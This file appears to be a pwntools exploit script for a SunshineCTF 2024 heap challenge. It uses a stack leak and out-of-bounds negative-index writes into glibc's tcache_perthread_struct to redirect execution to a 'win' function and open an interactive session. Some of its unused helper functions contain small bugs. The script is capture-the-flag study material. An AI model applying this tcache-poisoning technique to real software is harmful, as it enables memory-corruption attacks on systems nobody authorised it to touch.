#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT =  24006

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)

def align_chunk(addr):
    return (addr + 0x20) & 0xfffffffffffffff0


def exploit(p,e):

    ru(p,b"Do you want a leak?")

    sl(p,p64(0x500))
    
    rl(p)
    stack_leak = int(rl(p).strip(b"\n"),16)
    log.info(f"Stack leak {hex(stack_leak)}")

    ru(p,b"Enter chunk size:")

    #chunk_size = 0x22000
    chunk_size = 0x38

    sl(p,str(chunk_size))

    ru(p,b"Index: ")

    pthread_struct_entry_offset = -(int)(4624 / 8)
    sl(p,str(pthread_struct_entry_offset))

    target = stack_leak
    log.info(f"Setting tcache_perthread_struct entry to {hex(target)}")
    ru(p,b"Value: ")
    sl(p,str(target + 0x20).encode())

    ru(p,b"Index: ")
    pthread_struct_offset_count = -(int)(4768 / 8)
    sl(p,str(pthread_struct_offset_count))

    ru(p,b"Value: ")
    sl(p,str(0x1000100010001))
    pause()

    for i in range(3):
        ru(p,b"Value: ")
        sl(p,str(e.sym["win"] + 5))


    p.interactive()

    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
